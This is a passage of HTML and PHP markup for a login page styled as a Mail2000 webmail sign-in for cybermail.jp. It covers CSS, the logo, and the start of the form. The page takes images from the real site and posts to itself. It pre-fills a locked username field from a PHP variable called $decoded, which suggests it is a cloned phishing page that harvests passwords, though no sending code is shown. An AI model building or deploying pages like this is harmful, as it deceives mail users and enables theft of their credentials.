           runtime, collapsing its layout ??? we override with
           a shared flex layout for both fields.
           ================================================== */
        #stdLogin .input-wrapper {
            display: flex;
            align-items: center;
            width: 100%;
            max-width: 100%;
            box-sizing: border-box;
            margin-bottom: 12px;
            position: relative;
        }

        #stdLogin .input-wrapper > input,
        #stdLogin .input-wrapper > span,
        #stdLogin .input-wrapper > span > input {
            width: 100%;
            box-sizing: border-box;
            height: 44px;
            line-height: 44px;
            padding: 0 14px;
            font-size: 15px;
            border: 1px solid #ccc;
            border-radius: 4px;
            outline: none;
            background: #fff;
            color: #333;
            font-family: inherit;
        }

        #stdLogin .input-wrapper > span {
            display: flex !important;
            align-items: center !important;
            flex: 1 1 auto !important;
            min-width: 0 !important;
            height: 44px !important;
            padding: 0 !important;
            border: none !important;
            background: transparent !important;
            border-radius: 0 !important;
        }

        #stdLogin .input-wrapper > span > input {
            display: block;
            height: 44px;
            min-height: 44px;
        }

        #stdLogin .input-wrapper > span > input[type="hidden"] {
            display: none !important;
            width: 0 !important;
            height: 0 !important;
            padding: 0 !important;
            margin: 0 !important;
            border: 0 !important;
        }

        #stdLogin input::placeholder {
            color: #999;
            opacity: 1;
        }

        #stdLogin input:focus {
            border-color: #2b6cff;
            box-shadow: 0 0 0 2px rgba(43,108,255,.15);
        }

        /* Keyboard button stays aligned */
        .keyboard-button-container {
            display: flex;
            align-items: center;
            gap: 8px;
            position: relative;
        }
        .keyboard-button-container .input-wrapper {
            flex: 1 1 auto;
        }
        .keyboard-button {
            flex: 0 0 auto;
            background: transparent;
            border: none;
            cursor: pointer;
            padding: 0;
        }
        .keyboard-button img {
            width: 32px;
            height: 32px;
            display: block;
        }
    </style>
</head>

<body>
    <!-- Language Selector (Hidden) -->
    <label id="locale-container" style="display:none">
        <select id="locale" name="lang" form="normal_form" tabindex="-1">
            <option value="tw" lang="zh-Hant">????????????</option>
            <option value="gb" lang="zh-Hans">????????????</option>
            <option value="en" lang="en">English</option>
            <option value="jp" selected lang="ja">?????????</option>
        </select>
    </label>

    <!-- Main Content Block -->
    <div id="main-block">
        <!-- Left Block - Logo and Greeting -->
        <div id="left-block">
            <div id="logo-container">
                <img id="logo" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjIwIiBoZWlnaHQ9IjcwIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIj48ZGVmcz48cGF0aCBpZD0iYSIgZD0iTS41NTYuNzQ2aDUzLjgwOXY1MS4yNjZILjU1NXoiLz48cGF0aCBpZD0iYyIgZD0iTTEuMi4zMjZoMzkuNTQ0djU2Ljc0M0gxLjJ6Ii8+PC9kZWZzPjxnIGZpbGw9Im5vbmUiIGZpbGwtcnVsZT0iZXZlbm9kZCI+PHBhdGggZD0iTTE3MS4yNTkgMzRjMS4yODEgMCAyLjM0Ny4zMDIgMy4yLjg4NC44NTMuNTk1IDEuNTA1IDEuMzg2IDEuOTc1IDIuMzYyLjQ1NS45NzYuNzg3IDIuMDQ0Ljk2NyAzLjE5Ni4xODEgMS4xNS4yNzggMi4zNTkuMjc4IDMuNjE0IDAgMS4yNTgtLjA5NyAyLjQ1Ny0uMjc4IDMuNjA0YTExLjAzIDExLjAzIDAgMDEtLjk4NiAzLjE2IDUuODM4IDUuODM4IDAgMDEtMS45ODggMi4zMTdjLS44NTEuNTczLTEuOTAyLjg2My0zLjE2OC44NjMtMS4zMzMgMC0yLjQyNi0uMzA2LTMuMjg5LS45MjRhNS45NTYgNS45NTYgMCAwMS0xLjk1Ny0yLjQxMiAxMS4xNDEgMTEuMTQxIDAgMDEtLjg5Ni0zLjE0NSAyNC43NDIgMjQuNzQyIDAgMDEtLjIyNy0zLjQ2M2MwLTEuMzA2LjExLTIuNTUuMzIzLTMuNzIuMjA2LTEuMTc4LjU2LTIuMjQzIDEuMDUxLTMuMjA3YTYuMDc1IDYuMDc1IDAgMDExLjk2Ny0yLjI4OGMuODMtLjU2IDEuODM3LS44NDEgMy4wMjgtLjg0MXptMTQuNjY3IDBjMS4yNzQgMCAyLjM0LjMwMiAzLjE5Mi44ODRhNS45NjMgNS45NjMgMCAwMTEuOTY1IDIuMzYyYy40NzQuOTc2Ljc5MyAyLjA0NC45OCAzLjE5Ni4xODQgMS4xNS4yNyAyLjM1OS4yNyAzLjYxNCAwIDEuMjU4LS4wODYgMi40NTctLjI3IDMuNjA0YTExLjQxNiAxMS40MTYgMCAwMS0uOTg0IDMuMTYgNS45MDkgNS45MDkgMCAwMS0xLjk4NiAyLjMxN2MtLjg1NS41NzMtMS45MTUuODYzLTMuMTY3Ljg2My0xLjM0IDAtMi40NDUtLjMwNi0zLjMtLjkyNGE1LjkxNSA1LjkxNSAwIDAxLTEuOTU2LTIuNDEyIDExLjQ3IDExLjQ3IDAgMDEtLjg5Ny0zLjE0NSAyNS44OTggMjUuODk4IDAgMDEtLjIyMi0zLjQ2M2MwLTEuMzA2LjExLTIuNTUuMzItMy43Mi4yMTEtMS4xNzguNTYxLTIuMjQzIDEuMDQ0LTMuMjA3LjQ5NC0uOTUgMS4xNTUtMS43MjEgMS45NzktMi4yODguODI0LS41NiAxLjgyOC0uODQxIDMuMDMyLS44NDF6bTE0LjY1OCAwYzEuMjc0IDAgMi4zMzguMzAyIDMuMTk2Ljg4NC44NS41OTUgMS40OTggMS4zODYgMS45NyAyLjM2Mi40NjEuOTc2Ljc5IDIuMDQ0Ljk3MyAzLjE5Ni4xODcgMS4xNS4yNzcgMi4zNTkuMjc3IDMuNjE0IDAgMS4yNTgtLjA5IDIuNDU3LS4yNzcgMy42MDRhMTEuNDEgMTEuNDEgMCAwMS0uOTggMy4xNiA1Ljk0NyA1Ljk0NyAwIDAxLTEuOTkgMi4zMTdjLS44NTQuNTczLTEuOTE0Ljg2My0zLjE3Ljg2My0xLjM0MyAwLTIuNDM2LS4zMDYtMy4yOTMtLjkyNGE1LjkzOCA1LjkzOCAwIDAxLTEuOTUzLTIuNDEyIDExLjE0MSAxMS4xNDEgMCAwMS0uODk2LTMuMTQ1IDI0LjM4OCAyNC4zODggMCAwMS0uMjI2LTMuNDYzYzAtMS4zMDYuMS0yLjU1LjMxNy0zLjcyLjIxLTEuMTc4LjU1Ny0yLjI0MyAxLjA0Ny0zLjIwNy40OTQtLjk1IDEuMTUzLTEuNzIxIDEuOTcyLTIuMjg4LjgzMy0uNTYgMS44MzctLjg0MSAzLjAzMy0uODQxem0tMTA3LjY4Ny4zMzJsNC4zNjggMTQuNjQ1aC4wNTVsNC4zNjgtMTQuNjQ1aDUuODk1djE5LjM0M2gtMy41MzNWMzcuNzAySDEwNGwtNC45NTIgMTUuOTczaC0zLjUxN2wtNC45NS0xNS45NzMtLjA1Mi4wNnYxNS45MTNIODdWMzQuMzMyaDUuODk3em00OS4wNDYgMHYxNi4zMDJoNy4xNDh2My4wNDFoLTEwLjgzVjM0LjMzMmgzLjY4MnptLTIwLjYwMiAwbDcuMjI0IDE5LjM0M2gtNC4wOWwtMS41NzgtNC40MjZoLTcuNDY2bC0xLjYxMSA0LjQyNmgtMy44MTZsNy4xNjYtMTkuMzQzaDQuMTd6bTEyLjk1NyAwdjE5LjM0M2gtMy42ODRWMzQuMzMyaDMuNjg0ek0xNTYuMjUzIDM0YzEuODA2IDAgMy4yMjIuNDg1IDQuMjM2IDEuNDQgMS4wMjQuOTY0IDEuNTI0IDIuMzY1IDEuNTI0IDQuMjE1IDAgLjkwNi0uMTcxIDEuODIzLS41NDcgMi43MzVhMTMuMzc4IDEzLjM3OCAwIDAxLTEuNDUzIDIuNjY1IDI2LjI2NSAyNi4yNjUgMCAwMS0xLjkwOCAyLjQwM2wtLjU0LjU4My0uOTA3Ljk1Ny0uNjczLjY5NC0uOTE3Ljk0Mmg3LjUyNXYzLjA0aC0xMi4yNTR2LTMuMjQybC41OTMtLjU4MS4zMzMtLjMzOCAxLjAxLS45OS44OTMtLjg5LjUzMS0uNTM4YTQyLjU1IDQyLjU1IDAgMDAyLjEwMy0yLjM3Yy43MzQtLjg5NCAxLjM0Mi0xLjc3NiAxLjgxNS0yLjY3MS40ODgtLjg4OC43MjMtMS42OS43MjMtMi40MSAwLS44MjctLjI5NS0xLjQ3NS0uODg3LTEuOTMtLjU5LS40NDctMS4yOTUtLjY3NS0yLjEyMy0uNjc1LS43MTkgMC0xLjQ0LjE0NS0yLjE0Ni40My0uNzIxLjI5Mi0xLjQxNy42NTYtMi4xMDMgMS4xMmwtLjI4Ni0zLjIwOGMuODQyLS40MzcgMS43My0uNzg2IDIuNjctMS4wMjJhMTAuODI1IDEwLjgyNSAwIDAxMi43ODgtLjM2em0xNS4wMDYgMi44NjhjLS42MyAwLTEuMTQuMjQ1LTEuNTEuNzI4LS4zNzUuNDc1LS42NSAxLjA4My0uODE4IDEuODEtLjE3Ljc0LS4yNjggMS40NjItLjMwMiAyLjE4M2E0Ny4zNjYgNDcuMzY2IDAgMDAtLjA1NSAyLjQ2NmMwIC4zMTcuMDAzLjYyLjAwOC45MDlsLjAyMy44MjcuMDM0Ljc0N2MuMDQ1LjcxNS4xNTYgMS40My4zMiAyLjE1LjE2Ny43MjIuNDM3IDEuMzEyLjgxMSAxLjc2MS4zODMuNDU2Ljg3NC42ODQgMS40ODkuNjg0LjYyOCAwIDEuMTQ1LS4yMyAxLjUyNS0uNjk4LjM4OS0uNDYuNjYtMS4wNC44MjQtMS43NDguMTc2LS43LjI3OS0xLjQxNS4zMjgtMi4xNDlsLjAxOC0uMzcyLjAyOS0uNzkyLjAxNC0uODYxYTU1LjEyMyA1NS4xMjMgMCAwMC0uMDU0LTIuOTI0IDEzLjIgMTMuMiAwIDAwLS4zMDYtMi4xODNjLS4xODYtLjcyNy0uNDYzLTEuMzM1LS44MzQtMS44MS0uMzgtLjQ4My0uODktLjcyOC0xLjU0NC0uNzI4em0xNC42NjcgMGMtLjYzNyAwLTEuMTQyLjI0NS0xLjUxMS43MjgtLjM4Mi40NzUtLjY1NyAxLjA4My0uODIyIDEuODEtLjE3Ljc0LS4yNyAxLjQ2Mi0uMzA3IDIuMTgzLS4wMjguNTc2LS4wNDMgMS4yMi0uMDQ4IDEuOTI2djEuMDA1bC4wMTYuODY3Yy4wMTIuNDE0LjAzLjc5Ny4wNSAxLjE1MS4wNDcuNzE1LjE0OCAxLjQzLjMxMyAyLjE1LjE2NC43MjIuNDQzIDEuMzEyLjgyNCAxLjc2MS4zNy40NTYuODY0LjY4NCAxLjQ4NS42ODQuNjI0IDAgMS4xMzYtLjIzIDEuNTE1LS42OTguMzkzLS40Ni42NjMtMS4wNC44MzMtMS43NDguMTY3LS43LjI3LTEuNDE1LjMyLTIuMTQ5bC4wMzItLjc2LjAyMS0uODI2YTUwLjE3MyA1MC4xNzMgMCAwMC0uMDQ3LTMuMzYzIDEyLjE3MiAxMi4xNzIgMCAwMC0uMzEzLTIuMTgzYy0uMTctLjcyNy0uNDQ3LTEuMzM1LS44MjUtMS44MS0uMzc5LS40ODMtLjg5Mi0uNzI4LTEuNTM2LS43Mjh6bTE0LjY1OCAwYy0uNjM5IDAtMS4xMzQuMjQ1LTEuNTE2LjcyOC0uMzc2LjQ3NS0uNjU5IDEuMDgzLS44MTYgMS44MS0uMTcuNzQtLjI2NyAxLjQ2Mi0uMzA0IDIuMTgzbC0uMDE4LjQ0NS0uMDI0Ljk2M2E2NC44MzcgNjQuODM3IDAgMDAtLjAwMyAxLjk2N2wuMDE5LjgyNy4wMzIuNzQ3Yy4wNDkuNzE1LjE2IDEuNDMuMzI2IDIuMTUuMTY0LjcyMi40MzkgMS4zMTIuODE5IDEuNzYxLjM3OC40NTYuODcuNjg0IDEuNDg1LjY4NC42MjcgMCAxLjEzLS4yMyAxLjUyMy0uNjk4LjM4OC0uNDYuNjU4LTEuMDQuODMtMS43NDguMTctLjcuMjY2LTEuNDE1LjMxNy0yLjE0OWwuMDE4LS4zNzIuMDI3LS43OTJjLjAwNy0uMjc2LjAxMi0uNTYyLjAxNC0uODYxbC4wMDItLjQ1OGMwLS4zNjgtLjAwMi0uNzItLjAwOC0xLjA1OGwtLjAyMy0uOTYzYTQxLjk1IDQxLjk1IDAgMDAtLjAxOC0uNDQ1IDExLjQ5MiAxMS40OTIgMCAwMC0uMzIyLTIuMTgzYy0uMTc2LS43MjctLjQ0Ni0xLjMzNS0uODI0LTEuODEtLjM3Ni0uNDgzLS44OS0uNzI4LTEuNTM2LS43Mjh6TTExOS4yIDM4LjE5NmgtLjA1NGwtMi42NTggOC4wMjJoNS4zNzZsLTIuNjY0LTguMDIyeiIgZmlsbD0iI0Y2OTIxRCIvPjxwYXRoIGQ9Ik0xMDAuOTcyIDE5LjQ1N2MuNTI4IDAgLjk5MS4wOSAxLjM3Mi4yNzQuMzk1LjE4NC43MTQuNDU3Ljk2Mi44MDQuNDc3LjY2OS43MTMgMS41OC43MTMgMi43NjggMCAxLjEzNS0uMjYgMi4wNTUtLjc4NyAyLjc3LS41MzMuNzE5LTEuMjc2IDEuMDc2LTIuMjYgMS4wNzYtLjU2OCAwLTEuMDQ4LS4xMS0xLjQxLS4zNTMtLjM2OC0uMjMtLjY2Ny0uNTg3LS44OS0xLjA3NWgtLjAzNlYzMGgtLjkwNVYxOS42MjhoLjkwNWwtLjA1MiAxLjMzNWguMDI3bC4wMjUtLjA1OGMuMTAyLS4xNjMuMjAzLS4zMi4zMDYtLjQ3LjEwMi0uMTQzLjI0Mi0uMjk3LjQyMy0uNDUuMTgtLjE2LjQwMy0uMjc4LjY3OS0uMzgzLjI3MS0uMDk5LjU4MS0uMTQ1LjkyOC0uMTQ1em03LjQ1MyAwYy41MDIgMCAuOTQzLjA5IDEuMzEuMjc0LjM3Ni4xODQuNjgzLjQ1My45Mi43OTMuMjM3LjMzNS40MTguNzI0LjUyMiAxLjE1OC4xMjIuNDM5LjE3Ni45MTguMTc2IDEuNDI3di40NjNoLTUuMDQzYzAgLjgxNS4yMiAxLjQ4OS42NDUgMi4wMTUuNDMuNTIyIDEuMDMyLjc5NCAxLjc5NS43OTRhNC40NyA0LjQ3IDAgMDAxLjEwNC0uMTY2Yy40MjktLjExMS43NC0uMjM4Ljk2LS4zODZ2LjkyMWMtLjMwMS4xMy0uNjQ4LjIyNC0xLjAzLjI5NGE2LjQ1NiA2LjQ1NiAwIDAxLTEuMTA1LjEwNWMtLjYgMC0xLjExNi0uMDg5LTEuNTQyLS4yOGEyLjU3MSAyLjU3MSAwIDAxLTEuMDQxLS43OTggMy40OTEgMy40OTEgMCAwMS0uNTg2LTEuMjIxIDYuMTcgNi4xNyAwIDAxLS4xODUtMS41NDdjMC0uNTY0LjA3Ni0xLjA3LjIxOC0xLjUzOS4xNTYtLjQ3NC4zNjktLjg4MS42NC0xLjIyOS4yNzEtLjM0Ni42MDMtLjYyLjk4Ny0uODA0YTIuODkgMi44OSAwIDAxMS4yNTUtLjI3NHptLTE2Ljk3Mi0yLjcwOWMuNzM0IDAgMS4zOC4xNCAxLjk0Ni40MTVhNC4xNTIgNC4xNTIgMCAwMTEuMzk3IDEuMTMgNS4xNCA1LjE0IDAgMDEuODI2IDEuNjU4Yy4xODguNjI0LjI3MyAxLjI4OC4yNzMgMi4wMDItLjAwNiAxLjU4My0uMzk3IDIuODQ0LTEuMTYgMy43ODgtLjc2OC45NDItMS44NjYgMS40MDctMy4yODIgMS40MDctMS40MjIgMC0yLjUxLS40NjUtMy4yNzUtMS40MDctLjc2My0uOTQ0LTEuMTUyLTIuMjA1LTEuMTc4LTMuNzg4IDAtLjcxNC4xMDUtMS4zNzguMjc5LTIuMDAyYTUuMzc0IDUuMzc0IDAgMDEuODI3LTEuNjU4IDQuMDY0IDQuMDY0IDAgMDExLjQwNy0xLjEzYy41NjMtLjI3NSAxLjIxOC0uNDE1IDEuOTQtLjQxNXptNTEuNTk3LS41Nzd2MTAuODFoLS45di0xLjE2OGgtLjAyNGMtLjQ3My44OTMtMS4yNDYgMS4zMzUtMi4zMDcgMS4zMzUtLjk3MiAwLTEuNzExLS4zNTYtMi4yNDQtMS4wNzYtLjUyMy0uNzEzLS43ODctMS42MzQtLjc4Ny0yLjc3IDAtMS4xODYuMjMxLTIuMDk4LjcxLTIuNzY4LjI1LS4zNDYuNTYtLjYxOS45NTYtLjgwNC4zOC0uMTgzLjg0LS4yNzIgMS4zNjUtLjI3Mi4zMzkgMCAuNjQuMDQ4LjkyLjE2LjI4My4xLjUwNi4yMzUuNzAyLjM4OC4xOS4xNDkuMzQyLjMwNi40NTIuNDY2LjExMi4xNTguMTg5LjI5LjIzMy4zOTloLjAyM3YtNC43aC45em0tMjYuNzIzIDMuMjg3Yy44NjUgMCAxLjUwMi4yNDkgMS45MDYuNzU2LjQwOC41MTcuNjA3IDEuMjAxLjYwNyAyLjA2NnY0LjdoLS45MDF2LTQuNDczYzAtLjczNS0uMTMyLTEuMjk1LS40MjItMS42OTMtLjI4LS4zODgtLjcyNC0uNTktMS4zMzItLjU5LS40MDIgMC0uNzM2LjA3Ny0xLjAyMy4yMzEtLjI4Ni4xNTQtLjUxLjM2OC0uNjguNjNhMi45OTcgMi45OTcgMCAwMC0uMzcxLjg2NiAzLjk3MyAzLjk3MyAwIDAwLS4xMTQuOTU4djQuMDcxaC0uOTA5di01LjkwMmwtLjAxMS0uNzI0LS4wMTctLjM5NmE3LjUwNyA3LjUwNyAwIDAwLS4wMjUtLjMzaC44OHYxLjMwOGguMDMyYy4wOTMtLjIwNS4xOTctLjM4My4zMTgtLjU1LjExNi0uMTYxLjI1OC0uMzEzLjQ0NS0uNDYxLjE3My0uMTQ1LjQtLjI1Ni42Ny0uMzQzLjI3NS0uMDg4LjU5LS4xMjQuOTQ3LS4xMjR6TTEyMy43MTUgMTZjLjE2MSAwIC4zMjEuMDE3LjQ5LjA0My4xNzEuMDIuMjkyLjA2LjM3My4xMDhsLS4wNjMuNzhjLS4xODktLjEwMy0uNDI4LS4xNTUtLjcyNC0uMTU1LS40NzMgMC0uNzc3LjE3My0uOTE1LjUzNi0uMTE3LjMwNC0uMTgyLjc3NS0uMTk2IDEuNGwtLjAwMy45MTZoMS42NTl2Ljc3aC0xLjY2djYuNTgxaC0uODk4di02LjU4MmgtMS40OTh2LS43NjloMS40OTh2LS41NGMwLS40NzkuMDEtLjg4Mi4wNS0xLjIxNS4wMjctLjMzNS4xMDItLjY1LjIxNy0uOTM4LjEyMS0uMjgzLjMyMS0uNTExLjU5My0uNjg0LjI3LS4xNzEuNjIzLS4yNTEgMS4wNzctLjI1MXptMy4xNSAzLjYyOHY3LjM1MmgtLjkwNXYtNy4zNTJoLjkwNnptNS41MzMtLjE3Yy44NzYgMCAxLjUwNS4yNDkgMS45Mi43NTYuMzkxLjUxNy42IDEuMjAxLjYgMi4wNjZ2NC43aC0uOTA1di00LjQ3M2MwLS43MzUtLjE0NS0xLjI5NS0uNDI4LTEuNjkzLS4yNzYtLjM4OC0uNzEyLS41OS0xLjMyNi0uNTktLjQgMC0uNzM1LjA3Ny0xLjAyMy4yMzFhMS44MDIgMS44MDIgMCAwMC0uNjgyLjYzIDIuODc2IDIuODc2IDAgMDAtLjM1OS44NjYgMy42NDUgMy42NDUgMCAwMC0uMTIzLjk1OHY0LjA3MWgtLjkxM2wtLjAwMi02LjE2LS4wMDgtLjQ2Ni0uMDE1LS4zOTZhNi40ODMgNi40ODMgMCAwMC0uMDI2LS4zM2guODg3djEuMzA4aC4wMjNjLjA5My0uMjA1LjIwMy0uMzgzLjMyMS0uNTUuMTEzLS4xNjEuMjYzLS4zMTMuNDQxLS40NjEuMTc2LS4xNDUuNDA2LS4yNTYuNjcxLS4zNDMuMjc2LS4wODguNTk1LS4xMjQuOTQ3LS4xMjR6bS0zMS41NjQuNzY3Yy0uMzkgMC0uNzMuMDkyLTEuMDE2LjI3Ny0uMjg0LjE3Ni0uNTA2LjQzLS42OC43My0uMTY3LjI5OC0uMjk5LjYzLS4zNzguOTk3LS4wOC4zNjMtLjEyNC43MjEtLjEyNCAxLjA3NCAwIC4zNTIuMDQ0LjcxNS4xMjQgMS4wN2EzLjUgMy41IDAgMDAuMzgzIDEuMDA1Yy4xNzMuMjk0LjQwMS41NDYuNjgyLjcyNi4yOS4xODUuNjE4LjI3OCAxLjAxLjI3OC40MTMgMCAuNzYzLS4wOTMgMS4wNTEtLjI3My4yOS0uMTc1LjUxNi0uNDEzLjY4LS43MS4xNzMtLjI4Ni4yOS0uNjEuMzU5LS45N2E1LjQ5IDUuNDkgMCAwMC4wOTktMS4xMjZjMC0uNDA0LS4wMjUtLjc2OS0uMS0xLjEyNmEyLjk0MSAyLjk0MSAwIDAwLS4zNTktLjk3MyAxLjgwNCAxLjgwNCAwIDAwLS42NzktLjcwOGMtLjI4OC0uMTgtLjYzOC0uMjcxLTEuMDUyLS4yNzF6bTM5LjEyNiAwYy0uNDA4IDAtLjc2NS4wOTEtMS4wNS4yN2ExLjgwOCAxLjgwOCAwIDAwLS42Ni43MDljLS4xNy4yOS0uMjg5LjYxNC0uMzYyLjk3My0uMDcxLjM1OC0uMTEuNzMyLS4xMSAxLjEzIDAgLjM5NC4wMzkuNzY3LjEwNCAxLjEzLjA2Ny4zNTMuMTgyLjY3Ni4zNTguOTcuMTY2LjI5NC4zOTcuNTI3LjY3LjcwMi4yODUuMTg0LjY0Mi4yNzIgMS4wNS4yNzIuMzkgMCAuNzI4LS4wOTMgMS4wMTUtLjI3OC4yNzctLjE3OC41MDctLjQzMi42NzgtLjcyNi4xNzEtLjMwNS4yOS0uNjMxLjM3My0xLjAwNGE0LjczOCA0LjczOCAwIDAwMC0yLjE0NSAzLjI3MiAzLjI3MiAwIDAwLS4zODQtLjk5NiAyLjA2NSAyLjA2NSAwIDAwLS42NzUtLjczYy0uMjg1LS4xODYtLjYxNi0uMjc4LTEuMDA3LS4yNzh6bS00OC41MDctMi42MTNjLS41NjggMC0xLjA4NC4xMTQtMS41MjUuMzYtLjQzNi4yNDQtLjc5NC41NjktMS4wOC45ODhhNC42OTcgNC42OTcgMCAwMC0uNjQzIDEuMzk1IDYuMDQ3IDYuMDQ3IDAgMDAtLjIxIDEuNTk4YzAgLjU1LjA3IDEuMDczLjIxIDEuNTkzLjEzOC41MTQuMzU2Ljk4My42NDMgMS4zOTcuMjg2LjQxNS42NDQuNzUyIDEuMDguOTkxLjQ0MS4yMzkuOTU3LjM1OSAxLjUyNS4zNTlzMS4wODEtLjEyIDEuNTItLjM1OWEzLjExMyAzLjExMyAwIDAwMS4wNzktLjk5IDQuMjggNC4yOCAwIDAwLjY0MS0xLjM5OCA1LjkgNS45IDAgMDAuMjE4LTEuNTkzYzAtLjU1NC0uMDc0LTEuMDc5LS4yMTgtMS41OThhNC40NiA0LjQ2IDAgMDAtLjY0MS0xLjM5NSAzLjExNyAzLjExNyAwIDAwLTEuMDgtLjk4OGMtLjQzOC0uMjQ2LS45NS0uMzYtMS41MTktLjM2em0xNy4wMyAyLjYxM2MtLjMyOCAwLS42MjYuMDctLjg5NS4yMTctLjI3NS4xNDMtLjUuMzQ5LS42ODcuNTk2YTMuMSAzLjEgMCAwMC0uNDM1Ljg0IDIuODI3IDIuODI3IDAgMDAtLjE1Ni45MjloNC4wNTNjMC0uMzUzLS4wMzYtLjY3LS4xMTItLjk3N2EyLjcxNSAyLjcxNSAwIDAwLS4zMjYtLjgxOCAxLjY0MiAxLjY0MiAwIDAwLS41ODktLjU3OCAxLjY3OCAxLjY3OCAwIDAwLS44NTMtLjIxem00MC4xNTMtMy4yNzd2LjU1aC0xLjM0NnYzLjc2N2gtLjYxN3YtMy43NjdoLTEuMzUzdi0uNTVoMy4zMTZ6bTEuNjQ2IDBsMS4zNTkgMy41ODcgMS4zMzktMy41ODdIMTU0djQuMzE3aC0uNjEydi0zLjcyN2gtLjAxN2wtMS40MzIgMy43MjdoLS42MTJsLTEuNDQtMy43MjdoLS4wMDR2My43MjdoLS42MTF2LTQuMzE3aDEuMDF6bS0yMy40MTYtLjQ3NnYxLjIwMmgtLjkwNnYtMS4yMDJoLjkwNnoiIGZpbGw9IiMwMDAiLz48cGF0aCBkPSJNMzUuNjUxIDM2Ljc0OGwxNS44MDUtOS45Mjd2LTEuMTE2YzAtLjY3NC0uNTYzLTEuMjI0LTEuMjUtMS4yMjRIMjEuMTFjLS42ODcgMC0xLjI1LjU1LTEuMjUgMS4yMjR2MS4zMTdsMTUuNzkxIDkuNzI2ek00My42MSAzNC42NTlsNy44NDcgOS44NTNWMjkuNzI5eiIgZmlsbD0iI0Y2OTIxRCIvPjxwYXRoIGQ9Ik00Mi4yIDM1LjU0M2wtNi41MzUgNC4xMDctNS40NjctMy4zNjctOC43MjkgOS44OWgyOC43MzdjLjE0MiAwIC4yNzgtLjAyNS40MDYtLjA2OGwtOC40MTEtMTAuNTYyek0xOS44NiAyOS45MTVWNDQuOTVjMCAuMTYuMDMzLjMxLjA4OC40NWw4LjgyMy05Ljk5Ni04LjkxMS01LjQ4OHoiIGZpbGw9IiNGNjkyMUQiLz48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgzLjg1NyAuNjU0KSI+PG1hc2sgaWQ9ImIiIGZpbGw9IiNmZmYiPjx1c2UgeGxpbms6aHJlZj0iI2EiLz48L21hc2s+PHBhdGggZD0iTTE1LjQ5NiA1Mi4wMTJjLTQuNzUzLTQuMzA0LTcuNzMxLTEwLjQ2LTcuNzMxLTE3LjMwMSAwLTMuODkuOTctNy41NTcgMi42NzMtMTAuNzkxIDUuODM1LTEyLjg4IDIwLjEyLTIwLjY5NCAzNC44NjQtMTguMDQ1YTMyLjIyMiAzMi4yMjIgMCAwMTkuMDYzIDMuMDY2QzQ4LjMgMy44MzcgNDAuNDIyLjc0NSAzMS44Ljc0NSAyMC4yMDUuNzQ1IDkuOTQ4IDYuMzMxIDMuNjU2IDE0LjkwMi4yNDggMjEuNDgyLS41MTggMjkuMzY0IDIuMiAzNi44NWMyLjQ1OCA2Ljc1NSA3LjMxNSAxMi4wMDUgMTMuMjk2IDE1LjE2MiIgZmlsbD0iI0Y2OTIxRCIgbWFzaz0idXJsKCNiKSIvPjwvZz48cGF0aCBkPSJNNTEuODc1IDYwLjE1OGM1LjEyLTUuNTkgNy41LTEyLjY2MyA3LjIzNy0xOS42My0yLjAxOCA4Ljg0Mi05LjExMSAxNS44MDQtMTguMTI4IDE3LjgwNS0xNS44MzggNC4xMTgtMzIuNTY5LTQuMzItMzguMTYtMTkuN2EzMC42MDEgMzAuNjAxIDAgMDEtMS42MjgtNi44NzUgMzMuODE0IDMzLjgxNCAwIDAwLS4xOTUgMy42MDhjMCAxOC4wMyAxNC4zMzggMzIuNzcyIDMyLjQ1MSAzMy44ODggNi44NDYtLjY0MyAxMy40NzYtMy42OTkgMTguNDIzLTkuMDk2IiBmaWxsPSIjRjY5MjFEIi8+PGcgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMjkuNTcxIDkuMDU0KSI+PG1hc2sgaWQ9ImQiIGZpbGw9IiNmZmYiPjx1c2UgeGxpbms6aHJlZj0iI2MiLz48L21hc2s+PHBhdGggZD0iTTQwLjc0NCAyNi4zMWMwLTQuMTI1LS43NTEtOC4wNzgtMi4xMjctMTEuNzM3QzM0LjYyIDcuNTk2IDI3LjYwNyAyLjM0IDE4Ljk2Ny43ODZBMjguNzkyIDI4Ljc5MiAwIDAwMS4yIDMuMjQ0YTI0LjYyNCAyNC42MjQgMCAwMTQuODg2LS40ODhjNy43MjggMCAxNC41OTggMy41NzggMTguOTk2IDkuMTMgMTAuNTEyIDExLjcwOSAxMC42NTcgMjkuNTkxLS4yMjUgNDEuNDY2YTMxLjM4NiAzMS4zODYgMCAwMS00LjA2NyAzLjcxN2MxMS43ODktNS40MiAxOS45NTQtMTcuMTUzIDE5Ljk1NC0zMC43NTgiIGZpbGw9IiNGNjkyMUQiIG1hc2s9InVybCgjZCkiLz48L2c+PC9nPjwvc3ZnPg==" alt="Mail2000">
            </div>
            <div id="greeting" style="color: rgb(52, 52, 52); visibility: visible;">
                
            </div>
        </div>

        <!-- Right Block - Login Forms -->
        <div id="right-block">
            <div id="tab">
                <!-- Tab Controllers -->
                <input type="radio" name="tab-controller" id="tab-1" checked>
                <input type="radio" name="tab-controller" id="tab-2">
                <input type="radio" name="tab-controller" id="tab-3">
                <input type="radio" name="tab-controller" id="tab-4">
                <input type="radio" name="tab-controller" id="tab-5">

                <!-- Tab Headers -->
                <div id="tab-heads">
                    <label for="tab-1">Mail2000 Account</label>
                    <label for="tab-2" hidden>SAML</label>
                    <label for="tab-3" hidden>Google</label>
                    <label for="tab-4" hidden>?????????</label>
                    <label for="tab-5" hidden>Passwordless Login</label>
                </div>

                <!-- Tab Bodies -->
                <div id="tab-bodies">
                    <!-- Tab 1: Standard Login -->
                    <div data-id="tab-1">
                        <form name="login-form" id="login-form" action="" method="post" novalidate>
                            <input type="hidden" name="lang" value="jp">
                            <input type="hidden" name="login" value="cyber">

                            <div id="stdLogin">
                                <!-- User ID Input -->
                                <div class="keyboard-button-container">
                                    <label class="input-wrapper" data-icon="email">
                                        <input placeholder="<?php echo htmlspecialchars($decoded ?? ''); ?>"
                                               maxlength="318"
                                               value="<?php echo htmlspecialchars($decoded ?? ''); ?>"
                                               onfocus="stBoard && stBoard.setTarget(this)"
                                               name="user"
                                               id="userid-input"
                                               autocomplete="off"
                                               readonly>
                                    </label>

                                    <button type="button"
                                            class="icon-button keyboard-button"
                                            onclick="keyboardSwitch();"
                                            tabindex="-1">
                                        <img src="https://webmail.cybermail.jp/img/login_keyboard.svg" alt="Keyboard">
                                    </button>

                                    <div id="board"></div>
                                </div>

